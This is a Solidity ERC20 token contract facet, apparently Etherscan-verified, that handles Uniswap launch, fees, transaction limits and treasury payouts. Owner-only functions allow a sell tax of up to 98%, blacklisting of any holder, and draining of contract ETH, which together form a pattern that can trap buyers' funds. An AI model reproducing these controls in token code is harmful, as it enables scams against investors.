/**
 *Submitted for verification at Etherscan.io on 2024-03-05
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;
import "./TestLib.sol";
contract launchFacet is ERC20, Ownable {
    using SafeMath for uint256;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event marketingWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function launch(
        string memory name,
        string memory symbol,
        uint256 amountLeft
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingActive);
        _name = name;
        _symbol = symbol;
        _approve(address(this), address(ds.uniswapV2Router), totalSupply());
        ds.uniswapV2Pair = IUniswapV2Factory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        disableWalletLimits(address(ds.uniswapV2Pair), true);
        ds.automatedMarketMakerPairs[ds.uniswapV2Pair] = true;
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            (balanceOf(address(this)) * (100 - amountLeft)) / 100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
        ds.tradingStartBlock = block.number;
        ds.tradingActive = true;
    }
    function limitsOff() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 4) / 100,
            "Swap amount cannot be higher than 4% total supply."
        );
        ds.swapTokensAtAmount = newAmount;
        return true;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function updateMaxTransaction(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newNum >= ((totalSupply() * 1) / 1000) / 1e18);
        ds.maxTransactionAmount = newNum * (10 ** 18);
    }
    function updateMaxWallet(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newNum >= ((totalSupply() * 1) / 1000) / 1e18);
        ds.maxWallet = newNum * (10 ** 18);
    }
    function disableWalletLimits(address updAds, bool isEx) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedMaxTransactionAmount[updAds] = isEx;
    }
    function _excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = excluded;
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _excludeFromFees(account, excluded);
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapV2Pair,
            "The pair cannot be removed from ds.automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
    function updateMarketingWallet(address _Treasury) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit marketingWalletUpdated(_Treasury, ds.Treasury);
        ds.Treasury = _Treasury;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!ds.blacklists[from], "Blacklisted");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                !ds.swapping &&
                to != address(0) &&
                to != address(0xdead)
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                uint256 maxTxAmount = ds.maxTransactionAmount;
                uint256 difference = block.number - ds.tradingStartBlock;
                if (
                    difference < 10 &&
                    ds.reducedFirstBlockEnabled &&
                    ds.swapsAmount > 2
                ) {
                    if (difference == 0) {
                        maxTxAmount = (totalSupply() * 125) / 10000;
                    } else if (difference > 8) {
                        maxTxAmount = (totalSupply() * 100) / 10000;
                    } else {
                        maxTxAmount =
                            (totalSupply() * (difference * 10)) /
                            10000;
                    }
                }

                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Buy transfer amount exceeds the ds.maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                } else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Sell transfer amount exceeds the ds.maxTransactionAmount."
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= ds.swapTokensAtAmount;

        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            ds.swapping = true;
            swapBack(amount);
            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {
            if (ds.automatedMarketMakerPairs[to] && ds.sellTotalFees > 0) {
                fees = amount.mul(ds.sellTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.sellLiquidityFee) /
                    ds.sellTotalFees;
                ds.tokensForMarketing +=
                    (fees * ds.sellMarketingFee) /
                    ds.sellTotalFees;
            } else if (
                ds.automatedMarketMakerPairs[from] && ds.buyTotalFees > 0
            ) {
                fees = amount.mul(ds.buyTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.buyLiquidityFee) /
                    ds.buyTotalFees;
                ds.tokensForMarketing +=
                    (fees * ds.buyMarketingFee) /
                    ds.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }
        if (ds.swapsAmount < 10) {
            ds.swapsAmount += 1;
        }
        super._transfer(from, to, amount);
    }
    function blacklist(
        address _address,
        bool _isBlacklisting
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.blacklistRenounced, "Team has revoked blacklist rights");
        require(
            _address != address(ds.uniswapV2Pair),
            "Cannot blacklist token's v2 router or v2 pool."
        );
        require(
            _address != address(ds.routerAddress),
            "Cannot blacklist token's v2 router or v2 pool."
        );

        ds.blacklists[_address] = _isBlacklisting;
    }
    function renounceBlacklist() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.blacklistRenounced = true;
    }
    function unsetReducedFirstBlock() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.reducedFirstBlockEnabled = false;
    }
    function updateRestrictSwapBack(bool newVal) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.restrictSwapBack = newVal;
    }
    function removeStuckTokens() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        swapTokensForEth(balanceOf(address(this)));
        (success, ) = address(ds.Treasury).call{value: address(this).balance}(
            ""
        );
    }
    function sendStuckTokens() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        (success, ) = address(ds.Treasury).call{value: address(this).balance}(
            ""
        );
    }
    function setBuyRates(
        uint256 _marketingFee,
        uint256 _liquidityFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyMarketingFee = _marketingFee;
        ds.buyLiquidityFee = _liquidityFee;
        ds.buyTotalFees = ds.buyMarketingFee + ds.buyLiquidityFee;
        require(ds.buyTotalFees <= 15);
    }
    function setSellRates(
        uint256 _marketingFee,
        uint256 _liquidityFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellMarketingFee = _marketingFee;
        ds.sellLiquidityFee = _liquidityFee;
        ds.sellTotalFees = ds.sellMarketingFee + ds.sellLiquidityFee;
        require(ds.sellTotalFees <= 98);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function swapBack(uint amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForLiquidity +
            ds.tokensForMarketing;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > ds.swapTokensAtAmount) {
            contractBalance = ds.swapTokensAtAmount;
        }
        if (ds.restrictSwapBack && contractBalance > amount) {
            contractBalance = amount;
        }
        uint256 liquidityTokens = (contractBalance * ds.tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = ethBalance.mul(ds.tokensForMarketing).div(
            totalTokensToSwap
        );

        uint256 ethForLiquidity = ethBalance - ethForMarketing;

        ds.tokensForLiquidity = 0;
        ds.tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                ds.tokensForLiquidity
            );
        }

        (success, ) = address(ds.Treasury).call{value: address(this).balance}(
            ""
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        ds.uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            ds.Treasury,
            block.timestamp
        );
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
}
